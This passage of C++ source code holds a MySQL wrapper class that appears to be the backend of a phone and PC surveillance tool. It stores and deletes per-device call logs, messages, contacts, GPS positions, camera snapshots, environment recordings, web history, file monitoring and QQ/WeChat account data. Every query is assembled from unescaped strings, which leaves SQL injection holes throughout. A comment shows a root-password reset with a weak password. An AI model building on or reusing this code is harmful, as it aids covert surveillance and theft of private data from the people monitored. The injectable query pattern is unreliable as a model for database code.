		if (0 == mysql_query(&mysqlInstance, cmd)) {
			delete cmd;
			return true;
		}
	}

	WriteLogFile(szlog);
	errorIntoMySQL();
	wsprintfA(szlog, "insertWifi2 error,errorno:%u,errorinfo:%s,username:%s,mac:%s\r\n", errorNum, errorInfo, username.c_str(), mac.c_str());
	WriteLogFile(szlog);
	return false;
}


string MySql::getIdFromAccount(string clientid) {
	char szcmd[1024];
	wsprintfA(szcmd, "select id from ph_accounts where client_id = %s", clientid.c_str());
	vector<vector<string>> data;
	bool ret = getDatafromDB(szcmd, data);
	if (ret)
	{
		if (data.size() <= 0)
		{
			return "";
		}
		else if (data.at(0).size() <= 0) {
			return "";
		}
		else {
			return data.at(0).at(0);
		}
	}
	else {
		char szout[1024];
		wsprintfA(szout, "getIdFromWifi error:%s\r\n", clientid.c_str());
		WriteLogFile(szout);
		return "";
	}
}



int MySql::insertAccount(string username, string mac, string infos,string type) {
	char cmd[1024];

	string clientid = getIDFromClient(mac);
	if (clientid == "")
	{
		wsprintfA(cmd, "insertAccount getIdFromClient:%s error\r\n", mac.c_str());
		WriteLogFile(cmd);
		return false;
	}

	string app = "";
	string qq = "qq";
	string weixin = "wx";
	if (type == "1")
	{
		app = qq;
	}
	else if (type == "2")
	{
		app = weixin;
	}
	else {
		app = "other";
	}

	string id = getIdFromAccount(clientid);
	if (id == "")
	{
		int len = wsprintfA(cmd, "INSERT INTO ph_accounts (client_id,%s) VALUES ('%s', '%s')",
			app.c_str(),clientid.c_str(), infos.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
	}
	else {
		int len = wsprintfA(cmd, "UPDATE ph_accounts SET %s = '%s' WHERE id = '%s'",
			app.c_str(), infos.c_str(), id.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
	}


	WriteLogFile(cmd);
	errorIntoMySQL();
	wsprintfA(cmd, "insertAccount error,errorno:%u,errorinfo:%s,username:%s,mac:%s\r\n", errorNum, errorInfo, username.c_str(), mac.c_str());
	WriteLogFile(cmd);

	return false;
}








int MySql::insertFilesOper(string mac, string fullname) {
	char cmd[1024];
	string clientid = getIDFromClient(mac);
	if (clientid == "")
	{
		return false;
	}

	replaceSplashAndEnterAndQuot(fullname);

	int len = wsprintfA(cmd, "INSERT INTO pc_filemonitor (client_id,content) VALUES ( %s, '%s')",clientid.c_str(), fullname.c_str());
	if (0 == mysql_query(&mysqlInstance, cmd)) {
		return true;
	}

	WriteLogFile(cmd);
	errorIntoMySQL();
	wsprintfA(cmd, "insertFilesOper error,errorno:%u,errorinfo:%s,mac:%s\r\n",
		errorNum, errorInfo, mac.c_str());
	WriteLogFile(cmd);

	return false;
}







bool MySql::connectMySQL(char* server, char* username, char* password, char* database, int port)
{
	if (mysql_real_connect(&mysqlInstance, server, username, password, database, port, 0, 0) != NULL) {
		return true;
	}
	else {
		char szout[1024];
		errorIntoMySQL();
		wsprintfA(szout, "connectMySQL error no:%u,desc:%s\r\n", errorNum, errorInfo);
		WriteLogFile(szout);
	}
		
	return false;
}



bool MySql::useDatabase(std::string dbname)
{
	string queryStr = "use ";
	queryStr += dbname;
	if (0 == mysql_query(&mysqlInstance, queryStr.c_str()))
	{
		return true;
	}
	else {
		errorIntoMySQL();
		char szout[1024];
		wsprintfA(szout,"use database error no:%u,desc:%s\r\n",errorNum,errorInfo);
		WriteLogFile(szout);
		return false;
	}
}


bool MySql::createDatabase(std::string dbname)
{
	std::string queryStr = "create database if not exists ";
	queryStr += dbname + "";
	if (0 == mysql_query(&mysqlInstance, queryStr.c_str()))
	{
		queryStr = "use ";
		queryStr += dbname;
		if (0 == mysql_query(&mysqlInstance, queryStr.c_str()))
		{
			return true;
		}
	}

	return false;
}



bool MySql::createdbTable(const std::string& query)
{
	if (0 == mysql_query(&mysqlInstance, query.c_str()))
	{
		return true;
	}

	return false;
}


MySql::MySql():errorNum(0), errorInfo("ok")
{
	//errorNum = 0;
	//lstrcpyA(errorInfo, "ok");

	char szout[1024];
	bool ret = false;

	MYSQL *tmpsql = mysql_init(&mysqlInstance);
	if (tmpsql <= 0)
	{
		errorNum = -1;
		WriteLogFile("mysql_init error\r\n");
		return;
	}

	int iret = 0;
	//int iret = mysql_library_init(0, NULL, NULL);
	iret = mysql_options(&mysqlInstance, MYSQL_SET_CHARSET_NAME, DEFAULT_MYSQL_CHAR_SET);

	ret = connectMySQL(HOSTNAME, USERNAME, PASSWORD, DATABASE_NAME, MYSQL_PORT);
	if (ret == false)
	{
		errorIntoMySQL();
		wsprintfA(szout, "mysql connect error:%u,info:%s\r\n", errorNum, errorInfo);
		WriteLogFile(szout);
		return;
	}

	ret = useDatabase(DATABASE_NAME);
	if (ret == false)
	{
		errorIntoMySQL();
		wsprintfA(szout, "mysql use error:%u,info:%s\r\n", errorNum, errorInfo);
		WriteLogFile(szout);
		return;
	}

	return;
}



string MySql::checkSingleID(string key, string value, string table) {
	char szcmd[1024];
	wsprintfA(szcmd, "select id from %s where %s=%s", table.c_str(), key.c_str(), value.c_str());
	vector<vector<string>> data;
	bool ret = getDatafromDB(szcmd, data);
	if (ret)
	{
		if (data.size() <= 0)
		{
			return "";
		}
		else if (data.at(0).size() <= 0) {
			return "";
		}
		else {
			return data.at(0).at(0);
		}
	}
	else {
		char szout[1024];
		wsprintfA(szout, "checkID error:%s\r\n", table.c_str());
		WriteLogFile(szout);

		return "";
	}
}



bool MySql::getDatafromDB(string queryStr, std::vector<std::vector<std::string> >& data)
{
	
	if (0 != mysql_query(&mysqlInstance, queryStr.c_str()))
	{
		char szout[1024];
		errorIntoMySQL();
		wsprintfA(szout, "getDatafromDB error no:%u,desc:%s\r\n", errorNum, errorInfo);
		WriteLogFile(szout);
		return false;
	}

	MYSQL_RES * result = mysql_store_result(&mysqlInstance);
	if (result <= 0)
	{
		//mysql_free_result(result);
		char szout[1024];
		errorIntoMySQL();
		wsprintfA(szout, "mysql_store_result error no:%u,desc:%s\r\n", errorNum, errorInfo);
		WriteLogFile(szout);
		return false;
	}

	unsigned long long row = mysql_num_rows(result);
	int field = mysql_num_fields(result);

	MYSQL_ROW line = NULL;
	line = mysql_fetch_row(result);

	std::string temp = "";
	while (NULL != line)
	{
		std::vector<std::string> linedata;
		for (int i = 0; i < field; i++)
		{
			if (line[i])
			{
				temp = line[i];
				linedata.push_back(temp);
			}
			else
			{
				temp = "";
				linedata.push_back(temp);
			}
		}
		line = mysql_fetch_row(result);
		data.push_back(linedata);
	}

	mysql_free_result(result);
	return true;
}

void MySql::errorIntoMySQL()
{
	errorNum = mysql_errno(&mysqlInstance);
	errorInfo = (char*)mysql_error(&mysqlInstance);
}

CRITICAL_SECTION gstCriticalSection = { 0 };

void MySql::initLock() {
	InitializeCriticalSection(&gstCriticalSection);
}

void MySql::enterLock() {
	EnterCriticalSection(&gstCriticalSection);
}

void MySql::leaveLock() {
	LeaveCriticalSection(&gstCriticalSection);
}


void MySql::closeMySQL()
{
	mysql_close(&mysqlInstance);
}


MySql::~MySql()
{

	closeMySQL();

	mysql_library_end();
}


//setup mysql
//mysqld --install
//mysqld --initialize --user=root --console
//net start mysql

//net stop mysql
//skip-grant-tables
//net start mysql
//mysql
// use mysql;
//update user set password=password("520") where user="root";
//flush privileges;


bool MySql::setting() {
	int value = 1;
	mysql_options(&mysqlInstance, MYSQL_OPT_RECONNECT, (char *)&value);

	string cmd = "set global max_allowed_packet=1024*1024*1024";
	if (mysql_query(&mysqlInstance, cmd.c_str())) {
		return false;
	}

	cmd = "set interactive_timeout=30*24*3600";
	if (mysql_query(&mysqlInstance, cmd.c_str())) {
		return false;
	}

	cmd = "set global wait_timeout=30*24*3600";
	if (mysql_query(&mysqlInstance, cmd.c_str())) {
		return false;
	}

	return true;
}


string MySql::getIDFromClient(int no) {
	char szcmd[1024];
	wsprintfA(szcmd, "select id from phone_clients where id='%u'", no);
	vector<vector<string>> data;
	bool ret = getDatafromDB(szcmd, data);
	if (ret)
	{
		if (data.size() <= 0)
		{
			return "";
		}
		else if (data.at(0).size() <= 0) {
			return "";
		}
		else {
			return data.at(0).at(0);
		}
	}
	else {
		return "";
	}
}


string MySql::getInfosFromClient(string no) {
	char szcmd[1024];
	wsprintfA(szcmd, "select infos from phone_clients where id='%s'", no.c_str());
	vector<vector<string>> data;
	bool ret = getDatafromDB(szcmd, data);
	if (ret)
	{
		if (data.size() <= 0)
		{
			return "";
		}
		else if (data.at(0).size() <= 0) {
			return "";
		}
		else {
			return data.at(0).at(0);
		}
	}
	else {
		return "";
	}
}


int MySql::insertUploadFile(string mac, string data) {
	char cmd[1024];
	string clientid = getIDFromClient(mac);
	if (clientid == "")
	{
		return false;
	}

	int len = wsprintfA(cmd, "INSERT INTO ph_uploadfile (client_id,file_path) VALUES ( %s, '%s')", clientid.c_str(), data.c_str());
	if (0 == mysql_query(&mysqlInstance, cmd)) {
		return true;
	}

	wsprintfA(cmd, "insertUploadFile:%s error,client:%s\r\n", data.c_str(), mac.c_str());
	WriteLogFile(cmd);
	return false;
}

int MySql::insertDownloadFile(string mac, string data) {
	char cmd[1024];
	string clientid = getIDFromClient(mac);
	if (clientid == "")
	{
		return false;
	}

	int len = wsprintfA(cmd, "INSERT INTO ph_downloadfile (client_id,file_path) VALUES ( %s, '%s')", clientid.c_str(), data.c_str());
	if (0 == mysql_query(&mysqlInstance, cmd)) {
		return true;
	}

	wsprintfA(cmd, "insertDownloadFile:%s error,client:%s\r\n", data.c_str(), mac.c_str());
	WriteLogFile(cmd);
	return false;
}


string MySql::getListFromWifi(string no) {
	char szcmd[1024];
	wsprintfA(szcmd, "select list from ph_wifi_info where client_id='%s'", no.c_str());
	vector<vector<string>> data;
	bool ret = getDatafromDB(szcmd, data);
	if (ret)
	{
		if (data.size() <= 0)
		{
			return "";
		}
		else if (data.at(0).size() <= 0) {
			return "";
		}
		else {
			return data.at(0).at(0);
		}
	}
	else {
		return "";
	}
}


int MySql::deleteUser(string username) {
	char cmd[1024];

	char * cmdformat = "DELETE FROM users WHERE name='%s'";
	wsprintfA(cmd, cmdformat, username.c_str());
	if (mysql_query(&mysqlInstance, cmd)) {
		return false;
	}
	return true;
}


int MySql::removedata(string imei) {
	char cmd[1024];
	string id = getIDFromClient(imei);
	if (id == "")
	{
		return false;
	}

	char * cmdformat = "DELETE FROM client_log WHERE client_id='%s'";
	wsprintfA(cmd, cmdformat, id.c_str());
	if (mysql_query(&mysqlInstance, cmd)) {
		return false;
	}

	cmdformat = "DELETE FROM cmd_log WHERE client_id='%s'";
	wsprintfA(cmd, cmdformat, id.c_str());
	if (mysql_query(&mysqlInstance, cmd)) {
		return false;
	}

	cmdformat = "DELETE FROM phone_clients WHERE id='%s'";
	wsprintfA(cmd, cmdformat, id.c_str());
	if (mysql_query(&mysqlInstance, cmd)) {
		return false;
	}

	cmdformat = "DELETE FROM ph_applist WHERE client_id='%s'";
	wsprintfA(cmd, cmdformat, id.c_str());
	if (mysql_query(&mysqlInstance, cmd)) {
		return false;
	}

	cmdformat = "DELETE FROM ph_bookmark WHERE client_id='%s'";
	wsprintfA(cmd, cmdformat, id.c_str());
	if (mysql_query(&mysqlInstance, cmd)) {
		return false;
	}

	cmdformat = "DELETE FROM ph_call_record WHERE client_id='%s'";
	wsprintfA(cmd, cmdformat, id.c_str());
	if (mysql_query(&mysqlInstance, cmd)) {
		return false;
	}

	cmdformat = "DELETE FROM ph_camera WHERE client_id='%s'";
	wsprintfA(cmd, cmdformat, id.c_str());
	if (mysql_query(&mysqlInstance, cmd)) {
		return false;
	}

	cmdformat = "DELETE FROM ph_client_info WHERE client_id='%s'";
	wsprintfA(cmd, cmdformat, id.c_str());
	if (mysql_query(&mysqlInstance, cmd)) {
		return false;
	}

	cmdformat = "DELETE FROM ph_contacts WHERE client_id='%s'";
	wsprintfA(cmd, cmdformat, id.c_str());
	if (mysql_query(&mysqlInstance, cmd)) {
		return false;
	}

	cmdformat = "DELETE FROM ph_env_record WHERE client_id='%s'";
	wsprintfA(cmd, cmdformat, id.c_str());
	if (mysql_query(&mysqlInstance, cmd)) {
		return false;
	}

	cmdformat = "DELETE FROM ph_files WHERE client_id='%s'";
	wsprintfA(cmd, cmdformat, id.c_str());
	if (mysql_query(&mysqlInstance, cmd)) {
		return false;
	}

	cmdformat = "DELETE FROM ph_file_op WHERE client_id='%s'";
	wsprintfA(cmd, cmdformat, id.c_str());
	if (mysql_query(&mysqlInstance, cmd)) {
		return false;
	}

	cmdformat = "DELETE FROM ph_gps_info WHERE client_id='%s'";
	wsprintfA(cmd, cmdformat, id.c_str());
	if (mysql_query(&mysqlInstance, cmd)) {
		return false;
	}

	cmdformat = "DELETE FROM ph_msg_record WHERE client_id='%s'";
	wsprintfA(cmd, cmdformat, id.c_str());
	if (mysql_query(&mysqlInstance, cmd)) {
		return false;
	}

	cmdformat = "DELETE FROM ph_proc WHERE client_id='%s'";
	wsprintfA(cmd, cmdformat, id.c_str());
	if (mysql_query(&mysqlInstance, cmd)) {
		return false;
	}

	cmdformat = "DELETE FROM ph_sd_files WHERE client_id='%s'";
	wsprintfA(cmd, cmdformat, id.c_str());
	if (mysql_query(&mysqlInstance, cmd)) {
		return false;
	}

	cmdformat = "DELETE FROM ph_sd_files_local WHERE client_id='%s'";
	wsprintfA(cmd, cmdformat, id.c_str());
	if (mysql_query(&mysqlInstance, cmd)) {
		return false;
	}

	cmdformat = "DELETE FROM ph_snapshot WHERE client_id='%s'";
	wsprintfA(cmd, cmdformat, id.c_str());
	if (mysql_query(&mysqlInstance, cmd)) {
		return false;
	}

	cmdformat = "DELETE FROM ph_web_record WHERE client_id='%s'";
	wsprintfA(cmd, cmdformat, id.c_str());
	if (mysql_query(&mysqlInstance, cmd)) {
		return false;
	}

	cmdformat = "DELETE FROM ph_wifi_info WHERE client_id='%s'";
	wsprintfA(cmd, cmdformat, id.c_str());
	if (mysql_query(&mysqlInstance, cmd)) {
		return false;
	}

	cmdformat = "DELETE FROM ph_accounts WHERE client_id='%s'";
	wsprintfA(cmd, cmdformat, id.c_str());
	if (mysql_query(&mysqlInstance, cmd)) {
		return false;
	}

	cmdformat = "DELETE FROM ph_wifi_info_2 WHERE client_id='%s'";
	wsprintfA(cmd, cmdformat, id.c_str());
	if (mysql_query(&mysqlInstance, cmd)) {
		return false;
	}
	cmdformat = "DELETE FROM ph_downloadfile WHERE client_id='%s'";
	wsprintfA(cmd, cmdformat, id.c_str());
	if (mysql_query(&mysqlInstance, cmd)) {
		return false;
	}

	cmdformat = "DELETE FROM ph_uploadfile WHERE client_id='%s'";
	wsprintfA(cmd, cmdformat, id.c_str());
	if (mysql_query(&mysqlInstance, cmd)) {
		return false;
	}

	return true;
}

int MySql::modifyInfo() {
	char szcmd[0x10000];

	for (int i = 0;i < 1000; i ++)
	{
		string id = getIDFromClient(i);
		if (id != "")
		{
// 			string list = getListFromWifi(id);
// 			if (list != "")
// 			{
// 				if (list.at(0) == '{' && list.back() == '}')
// 				{
// 					list.at(0) = '[';
// 					list.back() = ']';
// 					//list = '{' + list + '}';
// 					int len = sprintf(szcmd, "UPDATE ph_wifi_info SET list='%s' WHERE client_id=%s",
// 						list.c_str(), id.c_str());
// 					if (0 == mysql_query(&mysqlInstance, szcmd)) {
// 
// 					}
// 				}
// 				else 
// 					if (list.at(1) == '[' && list.at(list.length() - 2) == ']')
// 				{
// 					list.at(1) = ' ';
// 					list.at(list.length() - 2) = ' ';
// 					int len = sprintf(szcmd, "UPDATE ph_wifi_info SET list='%s' WHERE client_id=%s",
// 						list.c_str(), id.c_str());
// 					if (0 == mysql_query(&mysqlInstance, szcmd)) {
// 
// 					}
// 				}else 
// 						if (list.at(0) == '[' && list.back() == ']')
// 				{
// 					list.at(0) = '{';
// 					list.back() = '}';
// 					int len = sprintf(szcmd, "UPDATE ph_wifi_info SET list='%s' WHERE client_id=%s",
// 						list.c_str(), id.c_str());
// 					if (0 == mysql_query(&mysqlInstance, szcmd)) {
// 
// 					}
// 				}
//			}

			string oldinfos = getInfosFromClient(id);
			if (oldinfos != "")
			{
				string model = "";
				string newinfos = JsonSplit::slitInfomation(oldinfos, model);

				int len = sprintf(szcmd, "UPDATE phone_clients SET model='%s',infos='%s' WHERE id=%s",
						model.c_str(), newinfos.c_str(), id.c_str());
				if (0 == mysql_query(&mysqlInstance, szcmd)) {

				}
			}
		}
	}

	return 0;
}
#endif